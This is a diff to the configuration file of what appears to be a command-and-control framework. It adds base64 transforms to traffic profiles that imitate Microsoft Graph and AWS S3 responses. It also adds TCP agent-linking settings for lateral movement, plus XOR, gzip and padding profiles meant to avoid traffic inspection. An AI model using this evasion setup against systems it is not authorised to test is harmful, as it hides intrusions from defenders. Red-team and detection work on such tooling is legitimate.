@@ -240,6 +240,11 @@ rekey_value = "refresh"
 [[http_profiles.server_response.headers]]
 name = "Cache-Control"
 value = "no-store"
+# Response transforms - base64 encode for wire obfuscation
+[http_profiles.server_response.data]
+output = "body"
+[[http_profiles.server_response.data.transforms]]
+type = "base64"
 
 [[http_profiles.server_response]]
 name = "microsoft-graph-response"
@@ -251,6 +256,11 @@ rekey_value = "TokenExpired"
 [[http_profiles.server_response.headers]]
 name = "x-ms-ags-diagnostic"
 value = "{\"ServerInfo\":{\"DataCenter\":\"West US\"}}"
+# Response transforms - base64 encode
+[http_profiles.server_response.data]
+output = "body"
+[[http_profiles.server_response.data.transforms]]
+type = "base64"
 
 [[http_profiles.server_response]]
 name = "aws-s3-response"
@@ -262,6 +272,11 @@ rekey_value = "ExpiredToken"
 [[http_profiles.server_response.headers]]
 name = "x-amz-request-id"
 value = "%UUID%"
+# Response transforms - base64 encode
+[http_profiles.server_response.data]
+output = "body"
+[[http_profiles.server_response.data.transforms]]
+type = "base64"
 
 # CDN style response - looks like minified JS or analytics response
 [[http_profiles.server_response]]
@@ -1313,3 +1328,69 @@ name = "browser-profile"
 output = "body"
 [[smb_link.profiles.data.transforms]]
 type = "netbios"
+
+# =============================================================================
+# TCP LINK CONFIGURATION
+# =============================================================================
+# Settings for TCP-based agent linking (lateral movement across platforms)
+# TCP links work similarly to SMB but use TCP sockets instead of named pipes,
+# enabling cross-platform linking (Linux, Darwin, Windows).
+
+[tcp_link]
+# Connection settings
+default_port = 4444            # Default TCP port for listeners
+connection_timeout = 30        # Timeout for TCP connections in seconds
+max_message_size = 10485760    # Maximum message size in bytes (10MB)
+heartbeat_interval = 60        # Heartbeat interval in seconds for detecting dead links
+
+# Malleable field names for link protocol (inside encrypted layer)
+# Uses the same field names as SMB for consistency
+[tcp_link.malleable]
+link_data_field = "ld"                    # Array of linked agent data in POST
+link_commands_field = "lc"                # Array of commands for linked agents in GET response
+link_handshake_field = "lh"               # Initial handshake from TCP agent
+link_handshake_response_field = "lr"      # Handshake response for TCP agent
+routing_id_field = "r"                    # Short routing identifier
+payload_field = "p"                       # Encrypted payload blob
+
+# =============================================================================
+# TCP PROFILES - Transform configurations for TCP traffic
+# =============================================================================
+# These profiles define how TCP messages are obfuscated between agents.
+# Uses the same transform types as SMB profiles.
+#
+# Supported transforms: base64, base64url, hex, gzip, netbios, xor,
+#                       prepend, append, random_prepend, random_append
+
+# Default profile - no transforms (backward compatible, legacy JSON visible)
+[[tcp_link.profiles]]
+name = "default-tcp"
+
+# Binary obfuscation with compression and XOR masking
+[[tcp_link.profiles]]
+name = "binary-tcp"
+[tcp_link.profiles.data]
+output = "body"
+[[tcp_link.profiles.data.transforms]]
+type = "gzip"
+[[tcp_link.profiles.data.transforms]]
+type = "xor"
+value = "tcp_transform_key"
+[[tcp_link.profiles.data.transforms]]
+type = "random_prepend"
+length = 8
+charset = "hex"
+[[tcp_link.profiles.data.transforms]]
+type = "random_append"
+length = 8
+charset = "hex"
+
+# Base64 encoding - useful for text-based inspection avoidance
+[[tcp_link.profiles]]
+name = "base64-tcp"
+[tcp_link.profiles.data]
+output = "body"
+[[tcp_link.profiles.data.transforms]]
+type = "gzip"
+[[tcp_link.profiles.data.transforms]]
+type = "base64"
